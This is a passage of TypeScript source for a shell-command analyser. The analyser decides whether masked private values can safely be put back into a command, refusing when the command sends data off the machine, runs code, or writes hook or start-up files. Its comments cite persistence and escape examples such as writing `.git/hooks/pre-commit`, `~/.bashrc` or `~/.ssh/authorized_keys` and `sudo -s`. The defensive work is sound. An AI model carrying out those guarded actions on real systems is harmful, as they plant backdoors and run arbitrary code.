  /** The extent of every heredoc body, data or not, in the order read. */
  readonly bodies: Array<readonly [number, number]>;
  /** The target of every output redirection in shell code, quotes
   * removed; empty when it expands or cannot be read whole. */
  readonly outputs: string[];
  /** The line the last `<<` was met on, and its last `|`, read once per
   * line so that many operators on one line cost linear time. */
  line: { end: number; lastPipe: number };
  /** Whether the simple command the last `<<` was met in reads a heredoc
   * as data, by the command's start, read once per command. */
  heredocCommand: { start: number; data: boolean };
  /** `HEREDOC_OPERATOR`, sticky, for this scan alone. */
  readonly heredocOperator: RegExp;
  /** `PLACEHOLDER_REGEX`, sticky, for this scan alone. */
  readonly placeholderAt: RegExp;
  /** The command cannot be read whole: it leaves the grammar read
   * (`advance`), or a heredoc's closing line cannot be found. */
  broken: boolean;
}

/** A word of a simple command, quotes and escapes removed. */
interface Word {
  readonly text: string;
  /** How many leading characters of `text` were written unquoted. An
   * assignment's name and `=`, or a redirection's operator, count only
   * there: `'LC_ALL=C' grep …` runs a program named `LC_ALL=C`. */
  readonly bare: number;
  /** Where the word starts and ends in the text it was read from. */
  readonly start: number;
  readonly end: number;
}

/** What one simple command runs. */
interface Program {
  /** A redirection stands before the program word (`>| cat …`): shells
   * disagree on what such a prefix is, so the command is not judged as
   * the program that follows it. */
  readonly redirectedPrefix: boolean;
  /** Lower case, without directory or version suffix. */
  readonly name: string;
  /** Named by a path (`./run.sh`, `/tmp/x`): it runs a file. */
  readonly byPath: boolean;
  /** The wrappers it runs behind, normalised like `name`. */
  readonly wrappers: readonly string[];
  /** A wrapper runs a shell on a string (`sudo -s`, `env -S`). */
  readonly wrapperShell: boolean;
  /** Its arguments, as far as they were read. */
  readonly args: readonly string[];
  /** The program word as written; `undefined` for a wrapper that runs
   * on its own (`xargs`). */
  readonly literal: string | undefined;
  /** Assignments before the program, as written (`NAME=value cmd`). */
  readonly assigned: readonly string[];
}

/** What a command does, as far as restoring into it is concerned. */
interface Verdict {
  /** It sends data off the machine, runs a program in whose code no
   * value is safe (`sed`, `perl`), or is too long to read: nothing is
   * restored. */
  readonly offMachine: boolean;
  /** The context at each placeholder position, keyed by index. */
  readonly contextAt: ReadonlyMap<number, QuoteContext>;
  /** It runs code it is handed, or could not be read whole: nothing is
   * restored, since where a value lands in that code is unknown. */
  readonly runsCode: boolean;
  /** The placeholder positions where no value is restored: the program a
   * simple command runs or part of it, an assignment, a redirection
   * target, the arguments of `cd`, `export`, `alias` and the like. */
  readonly programAt: ReadonlySet<number>;
  /** How the command splits: its simple commands and heredoc bodies. */
  readonly layout: Layout;
}

/** The extents a command splits into, in the order the lexer met them. */
interface Layout {
  readonly commands: ReadonlyArray<readonly [number, number]>;
  readonly bodies: ReadonlyArray<readonly [number, number]>;
}

/** The verdict for a command that cannot be read whole: nothing comes back. */
const KEEP_ALL: Verdict = {
  offMachine: true,
  runsCode: true,
  contextAt: new Map(),
  programAt: new Set(),
  layout: { commands: [], bodies: [] },
};

/** True when `name` is one of the `SHELL_TOOLS`. */
export function isShellTool(name: unknown): boolean {
  return typeof name === 'string' && SHELL_TOOLS.has(name);
}

/** True when `command` sends data off the machine: a network client or an
 * upload, behind any wrapper, or code it runs that opens a URL or a
 * socket. */
export function sendsOffMachine(command: string): boolean {
  return judge(command, []).offMachine;
}

/** True when `value` can be put back as written in `context`: one plain
 * word, or in a data heredoc body a value that cannot end the body. */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (isDataBody(context)) return DATA_BODY_SAFE[context].test(value);
  return PLAIN_WORD.test(value);
}

function isDataBody(context: QuoteContext): context is DataBodyContext {
  return DATA_BODY_CONTEXTS.has(context);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command runs code it
 * is handed, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  return judge(command, [index]).contextAt.get(index) ?? 'none';
}

/** Read `command` once and judge it at each of `targets` (ascending). */
function judge(command: string, targets: readonly number[]): Verdict {
  if (command.length > MAX_COMMAND_CHARS || UNREAD_CHARACTERS.test(command)) {
    return KEEP_ALL;
  }
  const scan: Scan = {
    targets,
    contexts: [],
    commands: [],
    dataBodies: [],
    bodies: [],
    outputs: [],
    line: { end: -1, lastPipe: -1 },
    heredocCommand: { start: -1, data: false },
    heredocOperator: new RegExp(HEREDOC_OPERATOR.source, 'y'),
    placeholderAt: new RegExp(PLACEHOLDER_REGEX.source, 'y'),
    broken: false,
  };
  const closed = lex(command, scan) && !scan.broken;
  if (scan.broken) {
    return KEEP_ALL;
  }
  const read = readCommands(command, scan);
  if (read === undefined) return KEEP_ALL;
  const { programs, wordsAt } = read;
  // Data bodies are text written out, not commands: a commit message that
  // mentions `ssh` or `bash -c` neither sends nor runs anything.
  const code = withoutRanges(command, scan.dataBodies);
  // A program run by path (`./build.sh`) or a file made executable runs
  // code too.
  const strict = NESTED_INTERPRETER.test(code) || programs.some((p) => runsCode(p) || runsFile(p));
  // A data body written to a file that a shell, git or a hook runs later
  // is code: `cat > .git/hooks/pre-commit <<'EOF'`, `cat >> ~/.bashrc`.
  const written = scan.outputs.filter((t) => !NO_FILE_TARGETS.has(t));
  // A file written where something runs it later (a git hook, a shell
  // start-up file, a `bin/` directory), in any letter case (macOS file
  // systems ignore it). Programs that put a file in place by an argument
  // (`cp`, `mv`) are off the list, so only these targets need reading.
  const writesExecuted = written.some((t) => EXECUTED_LATER.test(` ${t}`));
  // `offMachine` also covers a program whose code no word is safe in.
  const offMachine =
    ANY_DELIMITER_IN_TEXT.test(code) ||
    programs.some((p) => ANY_DELIMITER_PROGRAMS.has(p.name)) ||
    NETWORK_CLIENT.test(code) ||
    programs.some(sendsOut) ||
    (strict && NETWORK_IN_CODE.test(code)) ||
    (URL_SCHEME.test(code) && !programs.every(isDataProgram));
  // A data body goes to standard output or to a plain document file; one
  // written elsewhere (`.git/config`, `Makefile`, `run.sh`) may be read
  // as code later.
  // A relative file written after a `cd` lands where the `cd` points, not
  // where its target reads (`cd .git && echo … > notes.md`): a command
  // that does both writes no plain file. (A directory an earlier command left is
  // not seen: a relative target is judged as written.)
  const movesThenWrites =
    written.some((t) => !t.startsWith('/') && !t.startsWith('~')) &&
    programs.some((p) => p.name === 'cd');
  const toPlainFiles = written.every(isDocument) && !movesThenWrites;
  const bodyContext = dataBodyContext(
    programs,
    strict || !closed || writesExecuted || !toPlainFiles,
  );
  // Any program outside the allowlist (`ARG_DATA_PROGRAMS`) keeps every
  // placeholder too: the lists above are a second line, not the rule.
  const unlisted = !programs.every(takesDataArgs);
  // A command that writes anything but a document, through a heredoc or
  // any other redirection (`echo {{…}} > run.sh`), may have it read later
  // as code or configuration: nothing comes back into it.
  const toCodeFile = !toPlainFiles;
  // Nothing comes back from a command judged whole: its positions need no
  // reading.
  const keepAll = offMachine || strict || writesExecuted || unlisted || toCodeFile;
  const contextAt = new Map<number, QuoteContext>();
  const programAt = new Set<number>();
  const sorted = [...scan.commands].sort((a, b) => a[0] - b[0]);
  targets.forEach((index, k) => {
    const context = scan.contexts[k] ?? 'none';
    if (strict) contextAt.set(index, 'none');
    else if (isDataBody(context)) contextAt.set(index, bodyContext(context));
    else contextAt.set(index, context);
    if (keepAll) return;
    if (holdsAt(index, sorted, wordsAt)) programAt.add(index);
  });
  return {
    offMachine,
    runsCode: strict || writesExecuted || unlisted || toCodeFile,
    contextAt,
    programAt,
    layout: { commands: scan.commands, bodies: scan.bodies },
  };
}

/** The words and program of every simple command `scan` met (heredoc
 * bodies lie between commands, never in one); `undefined` when a command
 * is past the read window, has a reserved word where its program would
 * stand, or assigns a variable other than the locale or time zone (to a
 * plain value) with no program after it. */
function readCommands(
  command: string,
  scan: Scan,
): { programs: Program[]; wordsAt: Map<number, Word[]> } | undefined {
  const programs: Program[] = [];
  // Each command's words, read once, for every placeholder in it.
  const wordsAt = new Map<number, Word[]>();
  for (const [start, end] of scan.commands) {
    // A simple command longer than the read window is not judged by the
    // part that was read: its later words could be options, redirections
    // or a program the rules never see.
    if (end - start > MAX_WORD_SCAN) return undefined;
    if (isBlank(command, start, end)) continue;
    const words = wordsOf(command.slice(start, end));
    if (words.length >= MAX_WORDS) return undefined;
    // Compound commands and keywords (`if`, `for`, `case`, `!`, …) are
    // outside the grammar read, also after an assignment or a redirection
    // (`LANG=C for …` runs a program named `for` in bash, fails in zsh).
    if (RESERVED_WORDS.has(words[skipPrefix(words, 0)]?.text ?? '')) return undefined;
    wordsAt.set(start, words);
    const p = programOf(words);
    // Assignments with no program after them (`PATH=…; grep …`) hold for
    // every later command.
    if (p === undefined && !assignsOnlyLocale(words)) return undefined;
    if (p !== undefined) programs.push(p);
  }
  return { programs, wordsAt };
}

/** True when every assignment among `words` sets the locale or time zone
 * to a plain value (`SAFE_ASSIGNMENT`). */
function assignsOnlyLocale(words: readonly Word[]): boolean {
  return words.every((w) => !isAssignment(w) || SAFE_ASSIGNMENT.test(w.text));
}

/** True when `w` is an assignment as a shell reads one: `NAME=` written
 * unquoted. */
function isAssignment(w: Word): boolean {
  return ENV_ASSIGNMENT.test(w.text) && w.text.indexOf('=') < w.bare;
}

/** The target of the redirection `w` is, read with its operator written
 * unquoted (`>x`, `2>'a b'`, `>'>x.md'`; not `'>x'`): empty when the
 * target is the next word, `undefined` when `w` is no redirection. */
function redirectedTarget(w: Word): string | undefined {
  const operator = REDIRECTION_OPERATOR.exec(w.text.slice(0, w.bare));
  return operator === null ? undefined : w.text.slice(operator[0].length);
}

/** True when `command` holds only whitespace from `start` to `end`. */
function isBlank(command: string, start: number, end: number): boolean {
  for (let k = start; k < end; k++) {
    if (!FIELD_SEPARATORS.has(command[k] ?? '')) return false;
  }
  return true;
}

/** `text` with each of `ranges` blanked out, offsets kept. */
function withoutRanges(text: string, ranges: ReadonlyArray<readonly [number, number]>): string {
  let out = '';
  let last = 0;
  for (const [start, end] of ranges) {
    out += text.slice(last, start) + ' '.repeat(end - start);
    last = end;
  }
  return out + text.slice(last);
}

/** True when no value may be restored at `index`: the placeholder stands
 * in the program word of the simple command around it (the words before
 * it are only assignments, redirections and wrappers), in an assignment,
 * in a redirection target, or in the arguments of `cd`, `export`, `alias`
 * and the like. A command past the
 * read window never gets here: `judge` keeps every placeholder of it. */
function holdsAt(
  index: number,
  sorted: ReadonlyArray<readonly [number, number]>,
  wordsAt: ReadonlyMap<number, readonly Word[]>,
): boolean {
  const start = enclosingStart(sorted, index);
  if (start === undefined) return false;
  const words = wordsAt.get(start);
  // Defensive: every command with a placeholder has its words read. One
  // without, or a placeholder in none of them, has an unknown role, so it
  // is held.
  if (words === undefined) return true;
  const offset = index - start;
  const k = words.findIndex((w) => w.end > offset);
  const own = words[k];
  if (own === undefined || own.start > offset) return true;
  const before = words.slice(0, k);
  // An assignment before the program sets the environment it runs with;
  // `--grep user={{…}}` after it is an argument.
  if (ENV_ASSIGNMENT.test(own.text) && programIsNext(before)) return true;
  // A redirection target is a file the command writes or reads: a value
  // there would choose which (`> ~/.ssh/authorized_keys`).
  if (REDIRECTION.test(own.text)) return true;
  if (before.length > 0 && REDIRECTION.exec(before.at(-1)?.text ?? '')?.[1] === '') return true;
  if (programIsNext(before)) return true;
  // `cd` chooses the directory every later command runs in, this one's
  // and, in a shell kept across calls, the next one's (git reads its
  // configuration and hooks there).
  const program = programOf(before);
  if (program === undefined) return false;
  if (program.name === 'cd') return true;
  return ENVIRONMENT_BUILTINS.has(program.name);
}

/** The start of the command extent around `index`, from extents sorted
 * by start (they do not nest): the last one that starts at or before
 * `index`, when it reaches it. */
function enclosingStart(
  sorted: ReadonlyArray<readonly [number, number]>,
  index: number,
): number | undefined {
  let lo = 0;
  let hi = sorted.length;
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    if ((sorted[mid]?.[0] ?? 0) <= index) lo = mid + 1;
    else hi = mid;
  }
  const extent = sorted[lo - 1];
  return extent !== undefined && extent[1] >= index ? extent[0] : undefined;
}

/** True when the word after `words` would be the program they run. */
function programIsNext(words: readonly Word[]): boolean {
  let k = skipPrefix(words, 0);
  for (;;) {
    const word = words[k];
    if (word === undefined) return true;
    const name = normalise(word.text);
    const options = WRAPPERS.get(name);
    if (options === undefined) return false;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** What a data heredoc body's context becomes, given the programs the
 * command runs: kept when they all treat it as data, the strictest rule
 * when one runs a file, else the double-quote rule. */
function dataBodyContext(
  programs: readonly Program[],
  strict: boolean,
): (context: QuoteContext) => QuoteContext {
  if (strict || programs.some(runsFile)) return () => 'none';
  if (programs.every(isDataProgram)) return (context) => context;
  return () => 'double';
}

function runsCode(p: Program): boolean {
  if (p.wrapperShell) return true;
  if (CODE_RUNNERS.has(p.name) || p.wrappers.some((w) => CODE_RUNNERS.has(w))) return true;
  const subcommands = CODE_SUBCOMMANDS.get(p.name);
  if (
    subcommands !== undefined &&
    (subcommands.size === 0 || p.args.some((a) => subcommands.has(a)))
  ) {
    return true;
  }
  const option = COMMAND_OPTIONS.get(p.name);
  return option !== undefined && p.args.some((a) => option.test(a));
}

function sendsOut(p: Program): boolean {
  if (NETWORK_PROGRAMS.has(p.name)) return true;
  const subcommands = NETWORK_SUBCOMMANDS.get(p.name);
  return subcommands !== undefined && p.args.some((a) => subcommands.has(a));
}

function runsFile(p: Program): boolean {
  return p.byPath || RUNS_FILE_PROGRAMS.has(p.name);
}

/** True when a value may be restored into `p`'s command (`ARG_DATA_PROGRAMS`). */
function takesDataArgs(p: Program): boolean {
  if (!listedAsWritten(p)) return false;
  if (p.redirectedPrefix) return false;
  if (p.literal === 'git') return ARG_DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return ARG_DATA_PROGRAMS.has(p.literal ?? '');
}

function isDataProgram(p: Program): boolean {
  if (!listedAsWritten(p)) return false;
  if (p.literal === 'git') return DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return DATA_PROGRAMS.has(p.literal ?? '');
}

/** True when `p` may count as a listed program at all: named exactly as a
 * list names it (no other case, version suffix, `.exe` or path), with no
 * wrapper, and with no assignment before it but the locale and time zone
 * to a plain value (`GIT_EDITOR=…` and the like choose what a listed
 * program runs). */
function listedAsWritten(p: Program): boolean {
  if (p.literal === undefined || p.wrappers.length > 0 || p.byPath) return false;
  return p.assigned.every((assignment) => SAFE_ASSIGNMENT.test(assignment));
}

/** The words at the start of a simple command, up to `MAX_WORDS`, each
 * whole: an option cluster is read to its end (`-nnn…O`). As in a shell,
 * an unquoted `<` or `>` ends the word before it: `a<{{…}}` is the word
 * `a`, then the redirection `<{{…}}`. */
function wordsOf(text: string): Word[] {
  const words: Word[] = [];
  let word = '';
  let inWord = false;
  let quote: string | undefined;
  let quotedAt: number | undefined;
  let wordStart = 0;
  let i = 0;
  const begin = (): void => {
    if (!inWord) wordStart = i;
    inWord = true;
  };
  const add = (ch: string): void => {
    begin();
    word += ch;
  };
  const quoting = (): void => {
    begin();
    quotedAt ??= word.length;
  };
  const flush = (): void => {
    if (inWord) words.push({ text: word, bare: quotedAt ?? word.length, start: wordStart, end: i });
    word = '';
    inWord = false;
    quotedAt = undefined;
  };
  for (; i < text.length && words.length < MAX_WORDS; i++) {
    const ch = text[i] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else add(ch);
      continue;
    }
    if (ch === '\\') {
      // A backslash before a newline continues the line; before anything
      // else it makes that character literal.
      const next = text[i + 1] ?? '';
      if (next !== '\n') {
        quoting();
        add(next);
      }
      i++;
      continue;
    }
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else add(ch);
      continue;
    }
    if (ch === "'" || ch === '"') {
      quoting();
      quote = ch;
    } else if (FIELD_SEPARATORS.has(ch)) flush();
    else {
      // Unquoted digits before the operator name its descriptor (`2>`;
      // `"2">` is the word `2`), and the operator's characters stay
      // together (`>>`, `<>`).
      const head = quotedAt === undefined && REDIRECTION_HEAD.test(word);
      if ((ch === '<' || ch === '>') && !head) flush();
      add(ch);
    }
  }
  if (words.length < MAX_WORDS) flush();
  return words;
}

/** The program a simple command runs: past environment assignments,
 * redirections and wrappers with their options. `undefined` when it runs
 * none (assignments or redirections alone). */
function programOf(words: readonly Word[]): Program | undefined {
  let k = skipPrefix(words, 0);
  const prefix = words.slice(0, k);
  const redirectedPrefix = prefix.some((w) => !isAssignment(w));
  const assigned = prefix.filter(isAssignment).map((w) => w.text);
  const first = words[k];
  if (first === undefined) return undefined;
  const wrappers: string[] = [];
  let wrapperShell = false;
  for (;;) {
    const word = words[k];
    // A wrapper with nothing after it runs on its own (`xargs` reads the
    // command from its input).
    if (word === undefined) {
      const last = wrappers.at(-1);
      if (last === undefined) return undefined;
      return {
        name: last,
        byPath: false,
        wrappers,
        wrapperShell,
        args: [],
        redirectedPrefix,
        literal: undefined,
        assigned,
      };
    }
    const name = normalise(word.text);
    const options = WRAPPERS.get(name);
    if (options === undefined) {
      const rest = words.slice(k + 1);
      return {
        name,
        byPath: word.text.includes('/'),
        wrappers,
        wrapperShell,
        args: rest.map((w) => w.text),
        redirectedPrefix,
        literal: word.text,
        assigned,
      };
    }
    wrappers.push(name);
    const skipped = skipWrapperArgs(words, k + 1, name, options);
    wrapperShell ||= skipped.shell;
    k = skipped.next;
  }
}

/** Skip a wrapper's options (with their arguments), assignments and
 * positional arguments from `k`, up to the program it runs; `shell` when
 * one of those options makes it run a shell on a string. */
function skipWrapperArgs(
  words: readonly Word[],
  k: number,
  wrapper: string,
  options: ReadonlySet<string>,
): { next: number; shell: boolean } {
  const shellOption = WRAPPER_SHELL_OPTION.get(wrapper);
  let left = WRAPPER_POSITIONALS.get(wrapper) ?? 0;
  let shell = false;
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return { next: i, shell };
    if (text.startsWith('-') && text !== '-') {
      shell ||= shellOption?.test(text) === true;
      i += options.has(text) ? 2 : 1;
    } else if (ENV_ASSIGNMENT.test(text)) i += 1;
    else if (left > 0) {
      left -= 1;
      i += 1;
    } else return { next: i, shell };
  }
}

/** Skip assignments and redirections from `k`. */
function skipPrefix(words: readonly Word[], k: number): number {
  let i = k;
  for (;;) {
    const word = words[i];
    if (word === undefined) return i;
    if (isAssignment(word)) {
      i += 1;
      continue;
    }
    const target = redirectedTarget(word);
    if (target === undefined) return i;
    i += target === '' ? 2 : 1;
  }
}

/** A program name as the sets list it: no directory, lower case, no
 * version or `.exe` suffix (`/usr/bin/Python3.12` → `python`). */
function normalise(word: string): string {
  const base = (word.split('/').at(-1) ?? word).toLowerCase();
  // `base64` is a name, not `base` version 64.
  if (ARG_DATA_PROGRAMS.has(base)) return base;
  const bare = base.replace(PROGRAM_SUFFIX, '');
  return bare === '' ? base : bare;
}

function codeFrame(): Frame {
  return { kind: 'code', cmdStart: 0 };
}

/** Lex `command`: record the context at each target, and the extent of
 * each simple command. Only a minimal grammar is read (`advance`); any
 * other construct sets `scan.broken`, and the command keeps every
 * placeholder. */
function lex(command: string, scan: Scan): boolean {
  const base = codeFrame();
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = 0;
  while (i < command.length) {
    record(scan, i, contextOf(stack));
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && frame.kind === 'code') {
      scan.commands.push([frame.cmdStart, i]);
      const next = readHeredocBodies(command, i + 1, pending, scan);
      // An unreadable delimiter or no closing line: the body's extent, and
      // so every command after it, is unknown, so the command is not read
      // at all.
      if (next === undefined) {
        scan.broken = true;
        return false;
      }
      pending.length = 0;
      frame.cmdStart = next;
      i = next;
      continue;
    }
    i += advance(stack, frame, pending, command, i, scan);
    // A command found unreadable needs no further reading.
    if (scan.broken) return false;
  }
  record(scan, command.length - 1, contextOf(stack));
  scan.commands.push([base.cmdStart, command.length]);
  // A heredoc operator with no body after it: not read either.
  if (pending.length > 0) scan.broken = true;
  return stack.length === 1;
}

/** Give `context` to every target not yet recorded up to `limit`. */
function record(scan: Scan, limit: number, context: QuoteContext): void {
  for (;;) {
    const target = scan.targets[scan.contexts.length];
    if (target === undefined || target > limit) return;
    scan.contexts.push(context);
  }
}

function contextOf(stack: readonly Frame[]): QuoteContext {
  const kind = stack.at(-1)?.kind;
  if (kind === 'single') return 'single';
  if (kind === 'double') return 'double';
  return 'none';
}

/** Read the token at `i`, update the quoting, return its length. Outside
 * single quotes an expansion, a substitution or an escape (`$`, a
 * backtick, a backslash) is not read: shells disagree on too much of what
 * they can hold (nested heredocs, comments, `case`, `${x:-…}` spanning
 * lines), so the command keeps every placeholder instead. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i] ?? '';
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (UNREAD_OUTSIDE_SINGLE.has(ch)) {
    scan.broken = true;
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  return advanceCode(stack, frame, pending, command, i, scan);
}

/** One character of shell code. Grouping and subshells (`( )`, `{ }`),
 * comments, `[[`, `case` branches (`;;`), a lone `&` (background, `|&`,
 * `<&`) and here-strings (`<<<`) are outside the grammar read. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i] ?? '';
  // A placeholder is one word, braces included.
  if (ch === '{') {
    scan.placeholderAt.lastIndex = i;
    if (scan.placeholderAt.test(command)) return scan.placeholderAt.lastIndex - i;
  }
  if (UNREAD_IN_CODE.has(ch) || outsideGrammar(command, i)) {
    scan.broken = true;
    return 1;
  }
  if (ch === '<' && command[i + 1] === '<') {
    return readHeredocOperator(command, i, frame, pending, scan);
  }
  if (ch === '>') return readOutputRedirection(command, i, scan);
  if (ch === "'") stack.push({ kind: 'single', cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', cmdStart: 0 });
  if (separatesCommands(command, i)) {
    scan.commands.push([frame.cmdStart, i]);
    frame.cmdStart = i + 1;
  }
  return 1;
}

/** True when the operator at `i` is one the grammar does not read. */
function outsideGrammar(command: string, i: number): boolean {
  const ch = command[i];
  const next = command[i + 1];
  if (ch === '#') return startsWord(command, i);
  if (ch === ';') return next === ';';
  if (ch === '[') return next === '[' && startsWord(command, i);
  if (ch === '<') return next === '<' && command[i + 2] === '<';
  // Only `&&` is read. `&>` is one redirection in bash and zsh but a
  // background `&` then `>` in dash and ksh, where the next word becomes a
  // program; any other `&` (background, `|&`, `<&`) is not read either.
  if (ch === '&') return next !== '&' && command[i - 1] !== '&';
  return false;
}

/** True when the character at `i` of shell code ends a simple command:
 * `;`, a line break, `|` (not the `>|` redirection) or either `&` of
 * `&&`. */
function separatesCommands(command: string, i: number): boolean {
  const ch = command[i];
  if (ch === undefined || !COMMAND_SEPARATORS.has(ch)) return false;
  if (ch === '|') return !isClobberBar(command, i);
  if (ch !== '&') return true;
  return command[i + 1] === '&' || command[i - 1] === '&';
}

/** True when the `|` at `i` belongs to the redirection `>|`. */
function isClobberBar(command: string, i: number): boolean {
  return command[i - 1] === '>';
}

/** Record the file the output redirection whose `>` is at `i` writes
 * (`>`, `>>`, `>|`, `>&FILE`, `<>`; `&>` never gets here:
 * `outsideGrammar`; `>!` and `>>&` mark the command unread); return the
 * operator's length, so the target is lexed as the word it is. A `>&`
 * that copies or closes a descriptor (`2>&1`, `>&-`) writes no file. */
function readOutputRedirection(command: string, i: number, scan: Scan): number {
  let j = i + 1;
  const appends = command[j] === '>';
  if (appends) j += 1;
  const duplicates = command[j] === '&';
  // `>!` overrides noclobber in zsh only; elsewhere it writes a file named
  // `!…`. `>>&` appends to a file in zsh (`>>&2` to one named `2`) and is
  // an error elsewhere. Either way the shells disagree on the target.
  if (command[j] === '!' || (appends && duplicates)) scan.broken = true;
  if (duplicates || command[j] === '|') j += 1;
  const target = redirectionTarget(command, j);
  if (!(duplicates && DESCRIPTOR_TARGET.test(target))) scan.outputs.push(target);
  return j - i;
}

/** The redirection target word that starts at `j`, after blanks, quotes
 * removed. Empty when it leaves a quote open or is longer than
 * `MAX_TARGET_CHARS`: a target that cannot be read is no document. (`$`,
 * backticks and backslashes outside single quotes leave the grammar read:
 * `advance`.) */
function redirectionTarget(command: string, j: number): string {
  let k = j;
  while (command[k] === ' ' || command[k] === '\t') k += 1;
  let target = '';
  let quote: string | undefined;
  for (; k < command.length && target.length <= MAX_TARGET_CHARS; k++) {
    const ch = command[k] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else target += ch;
      continue;
    }
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else target += ch;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    else if (TARGET_ENDS.has(ch)) break;
    else target += ch;
  }
  return quote === undefined && target.length <= MAX_TARGET_CHARS ? target : '';
}

/** True when the character at `i` begins a word of shell code. */
function startsWord(command: string, i: number): boolean {
  const before = command[i - 1];
  return before === undefined || COMMENT_PRECEDERS.has(before);
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * (`<<<` never gets here: `outsideGrammar`.) */
function readHeredocOperator(
  command: string,
  i: number,
  frame: Frame,
  pending: Heredoc[],
  scan: Scan,
): number {
  scan.heredocOperator.lastIndex = i;
  const m = scan.heredocOperator.exec(command);
  if (m === null) {
    pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
    return 2;
  }
  if (scan.heredocCommand.start !== frame.cmdStart) {
    const head = command.slice(frame.cmdStart, Math.min(i, frame.cmdStart + MAX_WORD_SCAN));
    scan.heredocCommand = {
      start: frame.cmdStart,
      data: readsHeredocAsData(programOf(wordsOf(head))),
    };
  }
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: scan.heredocCommand.data && !pipedLater(command, i, scan),
  });
  return m[0].length;
}

/** True when `p` reads its heredoc as data: `cat`, or `git commit` taking
 * its message from standard input (`-F -`, `-F-`, `--file=-`,
 * `--file -`), each by name with no wrapper or path. */
function readsHeredocAsData(p: Program | undefined): boolean {
  if (p === undefined || p.wrappers.length > 0 || p.byPath) return false;
  if (HEREDOC_DATA_COMMANDS.has(p.name)) return true;
  if (p.name !== 'git' || p.args[0] !== 'commit') return false;
  return p.args.some(
    (a, k) => STDIN_MESSAGE_FLAGS.has(a) || (MESSAGE_FILE_FLAGS.has(a) && p.args[k + 1] === '-'),
  );
}

/** True when a `|` follows `i` on its line. The line's end and last `|`
 * are found once per line. */
function pipedLater(command: string, i: number, scan: Scan): boolean {
  if (i > scan.line.end) {
    const newline = command.indexOf('\n', i);
    const end = newline === -1 ? command.length : newline;
    let lastPipe = -1;
    for (let k = end - 1; k > i; k--) {
      // `>|` is a redirection, not a pipe.
      if (command[k] === '|' && !isClobberBar(command, k)) {
        lastPipe = k;
        break;
      }
    }
    scan.line = { end, lastPipe };
  }
  return scan.line.lastPipe > i;
}

/** Walk the bodies of the heredocs that start at `start`, in order,
 * recording the targets in each; return where shell code resumes, or
 * `undefined` when a body has no closing line. */
function readHeredocBodies(
  command: string,
  start: number,
  pending: readonly Heredoc[],
  scan: Scan,
): number | undefined {
  let bodyStart = start;
  let resume = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc, command.length);
    if (end === undefined) return undefined;
    readBody(command, bodyStart, end.bodyEnd, heredoc, scan);
    resume = end.next;
    bodyStart = end.next + 1;
  }
  return resume;
}

/** Record the targets in one body. A bare-delimiter body that holds `$`,
 * a backtick or a backslash expands, which the grammar read leaves out:
 * the command is then not read. */
function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
  if (!heredoc.literal && BODY_EXPANSION.test(command.slice(start, end))) {
    scan.broken = true;
    return;
  }
  scan.bodies.push([start, end]);
  if (heredoc.data) scan.dataBodies.push([start, end]);
  const context = !heredoc.data ? 'none' : heredoc.literal ? 'heredoc' : 'heredoc-expanding';
  record(scan, end - 1, context);
}

/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
  limit: number,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= limit) {
    const found = command.indexOf('\n', lineStart);
    const newline = found === -1 || found >= limit ? -1 : found;
    const lineEnd = newline === -1 ? limit : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`), and
 * none in a command that sends data off the machine (`sendsOffMachine`).
 * The command is judged as received, then again with the values put back:
 * a value that makes it send data out or run code, or that moves where a
 * simple command or a heredoc body starts or ends (a value that reads as
 * the delimiter ends its heredoc early), keeps every placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const starts = [...command.matchAll(placeholderPattern())].map((m) => m.index);
  const verdict = judge(command, starts);
  const keepAll = verdict.offMachine || verdict.runsCode;
  const shifts: Shift[] = [];
  const restored = restoreEach(
    np,
    command,
    sessionId,
    (value, at) => {
